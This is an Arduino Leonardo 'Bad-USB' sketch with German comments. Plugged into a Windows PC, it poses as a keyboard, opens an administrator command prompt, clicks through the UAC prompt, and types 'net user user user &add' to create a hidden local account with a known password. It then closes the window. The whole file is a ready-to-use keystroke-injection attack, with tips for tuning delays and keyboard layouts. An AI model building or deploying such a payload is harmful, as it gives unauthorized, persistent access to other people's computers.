/*
  Ersteller: Emirhan Karakaya
  Datum: 23.11.2022
  Beschreibung: Programm für ein Bad-Usb mit Arduino (Arduino Leonardo)
                Öffnet mit Adminrechten Eingabeaufforderung und erstellt 
                einen Benutzer.
                Falls Fehler auftreten die Kommentare lesen!
                Optional delay() erhöhen delay(1000)=1000ms~1s
                *******************************
                *                             *
                *   Benutzername: user        *
                *   Passwort: user            *
                *                             *
                *******************************
  Email: emirhan.karakaya@gmx.at
*/


#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(8000);                    //Cmd öffen
  Keyboard.press(KEY_LEFT_GUI);
  delay(150);
  Keyboard.press('r');
  delay(150);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(150);
  Keyboard.print("cmd");

  Keyboard.press(KEY_LEFT_CTRL);    //Adminrechte
  delay(400);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(400);
  Keyboard.press(KEY_KP_ENTER);
  delay(400);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(400);
  Keyboard.release(KEY_LEFT_SHIFT);
  delay(400);
  Keyboard.release(KEY_KP_ENTER);
  delay(400);

  Keyboard.press(KEY_LEFT_ARROW);
  delay(150);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(150);


  Keyboard.press(KEY_KP_ENTER);         //Benutzer hinzufügen
  delay(150);
  Keyboard.release(KEY_KP_ENTER);
  delay(150);

  Keyboard.press(KEY_LEFT_SHIFT);   //Klickt aufs Cmd-Fenster 
  delay(150);
  Keyboard.release(KEY_LEFT_SHIFT);
  delay(150);



  Keyboard.println("net user user user &add"); /*
                                               Könnte je nach Tastatur-Layout nicht funktionierten
                                               Problem liegt bei: &add -> & Zeichen
                                               Bei einer Deutschen Tastatur kein Problem 
                                             */

  delay(1100);
                                             
  Keyboard.press(KEY_LEFT_ALT);   //Cmd beenden
  delay(150);
  Keyboard.press(KEY_F4);
  delay(150);

  Keyboard.release(KEY_LEFT_ALT);
  delay(150);
  Keyboard.release(KEY_F4);
  delay(150);

  Keyboard.end();
}
void loop()
{
  //Wird nicht benötigt
}
